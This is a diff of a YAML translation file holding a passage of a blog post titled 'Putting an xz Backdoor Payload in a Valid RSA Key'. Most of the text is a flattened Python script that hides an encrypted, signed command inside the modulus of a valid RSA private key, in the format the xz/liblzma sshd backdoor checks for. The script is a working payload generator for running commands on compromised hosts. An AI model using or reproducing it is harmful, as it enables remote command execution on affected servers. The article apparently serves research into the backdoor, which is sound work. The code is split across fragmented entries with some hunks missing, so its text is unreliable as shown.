@@ -1,20 +1,26 @@
 - en: <!--yml
+  id: totrans-split-0
   prefs: []
   type: TYPE_NORMAL
 - en: 'category: 未分类'
+  id: totrans-split-1
   prefs: []
   type: TYPE_NORMAL
 - en: 'date: 2024-05-27 12:52:19'
+  id: totrans-split-2
   prefs: []
   type: TYPE_NORMAL
 - en: -->
+  id: totrans-split-3
   prefs: []
   type: TYPE_NORMAL
 - en: Putting an xz Backdoor Payload in a Valid RSA Key | rya.nc
+  id: totrans-split-4
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
 - en: 来源：[https://rya.nc/xz-valid-n.html](https://rya.nc/xz-valid-n.html)
+  id: totrans-split-5
   prefs:
   - PREF_BQ
   type: TYPE_NORMAL
@@ -35,15 +41,26 @@
     integer to two''s complement big endian value encoded as a `bytearray``34`def
     int_to_bytearray(i):`35 `i = int(i)`36 `i_bytes = i.to_bytes((i.bit_length() +
     7) // 8, byteorder=''big'')`37 `# a leading zero byte is needed if first bit is
-    1`38 `if i_bytes[0] >= 0x80: i_bytes = b''\0'' + i_bytes`3940 `return bytearray(i_bytes)`4142`#
-    newer versions of gmpy2 have this natively :-/`43`def mpz_from_bytes(b, byteorder=''big'',
-    *, signed=False):`44 `return mpz(int.from_bytes(b, byteorder, signed=signed))`4546`#
+    1`38 `if i_bytes[0] >= 0x80: '
+  id: totrans-split-6
+  prefs: &id001 []
+  type: TYPE_NORMAL
+- en: 'i_bytes = b''\0'' + i_bytes`3940 `return bytearray(i_bytes)`4142`# newer versions
+    of gmpy2 have this natively :-/`43`def mpz_from_bytes(b, byteorder=''big'', *,
+    signed=False):`44 `return mpz(int.from_bytes(b, byteorder, signed=signed))`4546`#
     random prime, n bytes long`47`def random_prime(n):`48 `rand_bytes = urandom(n)`49
     `rand_start = mpz_from_bytes(rand_bytes)`50 `return next_prime(rand_start) # next
     *probable* prime`5152`# construct rsa private key given (n, e, d, p, q)`53`def
-    rsa_construct(n, e, d, p, q):`54 `# p should be greater than q`55 `if q > p: p,
-    q = q, p`5657 `# compute chinese remainder theorem values`58 `dmp1, dmq1 = map(lambda
-    x: int(d % (x - 1)), (p, q))`59 `iqmp = int(invert(q, p))`6061 `# build the key
+    rsa_construct(n, e, d, p, q):`54 `# p should be greater than q`55 `if q > p: '
+  id: totrans-split-7
+  prefs: *id001
+  type: TYPE_NORMAL
+- en: 'p, q = q, p`5657 `# compute chinese remainder theorem values`58 `dmp1, dmq1
+    = map(lambda x: '
+  id: totrans-split-8
+  prefs: *id001
+  type: TYPE_NORMAL
+- en: 'int(d % (x - 1)), (p, q))`59 `iqmp = int(invert(q, p))`6061 `# build the key
     from parameters`62 `n, e, d, p, q = map(int, (n, e, d, p, q))`63 `pub_params =
     RSAPublicNumbers(e, n)`64 `prv_params = RSAPrivateNumbers(p, q, d, dmp1, dmq1,
     iqmp, pub_params)`65 `return prv_params.private_key()`6667`# pem format unencrypted
@@ -61,10 +78,13 @@
     = pub_key[0:32]`9495`# command is null terminated`96`command = argv[4].encode()
     + b''\0''`97`if len(command) > 64:`98 `print(''command too long, should not exceed
     64 characters'', file=stderr)`99 `exit(1)`100101`# command needs to be at least
-    five bytes for signing, pad as required`102`while len(command) < 5: command +=
-    b''\0''`103104`# the first few bytes of an rsa modulus probably aren''t uniformly
-    distributed,`105`# so start off with an N value from a normally generated key`106`rsa
-    = rsa_generate(int(RSA_E), RSA_BITS)`107`n = rsa.private_numbers().public_numbers.n`108`n_bytes
+    five bytes for signing, pad as required`102`while len(command) < 5: '
+  id: totrans-split-9
+  prefs: *id001
+  type: TYPE_NORMAL
+- en: 'command += b''\0''`103104`# the first few bytes of an rsa modulus probably
+    aren''t uniformly distributed,`105`# so start off with an N value from a normally
+    generated key`106`rsa = rsa_generate(int(RSA_E), RSA_BITS)`107`n = rsa.private_numbers().public_numbers.n`108`n_bytes
     = int_to_bytearray(n)`109110`# xz backdoor precheck fields`111`cmd1, cmd2 = unpack_from(''<LL'',
     n_bytes, 0)`112`cmd3 = ((2**64 + COMMAND) - cmd1 * cmd2) % 2**64`113`pack_into(''<Q'',
     n_bytes, 8, cmd3)`114115`# build payload`116`hdr_magic = b''\2\0\0\0''`117`hdr_flags
@@ -74,19 +94,38 @@
     = signature + command`125`ciphertext = chacha20(plaintext, sym_key, n_bytes[:16])`126127`#
     splice the payload into the modulus`128`n_bytes = replace_at(n_bytes, ciphertext,
     16)`129`n = mpz_from_bytes(n_bytes)`130131`# We''ll choose a new prime `p` randomly,
-    then divide the modulus to get a new`132`# `q`. With this process the lowest bits
-    of the modulus corrosponding to the`133`# size (plus a few) of `p` get scrambled
-    while the upper bits of the modulus`134`# remain fixed. The size of `p` is chosen
-    here such that our payload is kept.`135`# NOTE: The security level of the key
-    scales down with the size of `p`.`136`p_bytes = min((RSA_BITS // 8 - 17) - len(ciphertext),
-    RSA_BITS // 16)`137138`# generate p, q to produce the evil modulus`139`tries =
-    0`140`while True:`141 `p = random_prime(p_bytes)`142 `q = next_prime(c_div(n,
-    p))`143 `n_payload = p * q`144 `n_payload_bytes = int_to_bytearray(n_payload)`145146
+    then divide the modulus to get a new`132`# `q`. '
+  id: totrans-split-10
+  prefs: *id001
+  type: TYPE_NORMAL
+- en: 'With this process the lowest bits of the modulus corrosponding to the`133`#
+    size (plus a few) of `p` get scrambled while the upper bits of the modulus`134`#
+    remain fixed. '
+  id: totrans-split-11
+  prefs: *id001
+  type: TYPE_NORMAL
+- en: 'The size of `p` is chosen here such that our payload is kept.`135`# NOTE: '
+  id: totrans-split-12
+  prefs: *id001
+  type: TYPE_NORMAL
+- en: 'The security level of the key scales down with the size of `p`.`136`p_bytes
+    = min((RSA_BITS // 8 - 17) - len(ciphertext), RSA_BITS // 16)`137138`# generate
+    p, q to produce the evil modulus`139`tries = 0`140`while True:`141 `p = random_prime(p_bytes)`142
+    `q = next_prime(c_div(n, p))`143 `n_payload = p * q`144 `n_payload_bytes = int_to_bytearray(n_payload)`145146
     `good = 0`147 `for i in range(len(ciphertext)):`148 `if n_payload_bytes[16+i]
-    == ciphertext[i]: good += 1`149 `else: break`150151 `if good == len(ciphertext):`152
-    `# parameter validation`153 `totient = lcm(p - 1, q - 1)`154 `if gcd(totient,
-    RSA_E) == 1:`155 `# compute private exponent`156 `d = invert(RSA_E, totient)`157158
-    `rsa = rsa_construct(n_payload, RSA_E, d, p, q)`159 `break`160161 `if tries :=
-    tries + 1 > 100:`162 `print(''failed to generate key'', file=stderr)`163 `exit(1)`164165`print(pem_private(rsa))`'
-  prefs: []
+    == ciphertext[i]: '
+  id: totrans-split-13
+  prefs: *id001
+  type: TYPE_NORMAL
+- en: 'good += 1`149 `else: '
+  id: totrans-split-14
+  prefs: *id001
+  type: TYPE_NORMAL
+- en: break`150151 `if good == len(ciphertext):`152 `# parameter validation`153 `totient
+    = lcm(p - 1, q - 1)`154 `if gcd(totient, RSA_E) == 1:`155 `# compute private exponent`156
+    `d = invert(RSA_E, totient)`157158 `rsa = rsa_construct(n_payload, RSA_E, d, p,
+    q)`159 `break`160161 `if tries := tries + 1 > 100:`162 `print('failed to generate
+    key', file=stderr)`163 `exit(1)`164165`print(pem_private(rsa))`
+  id: totrans-split-15
+  prefs: *id001
   type: TYPE_NORMAL
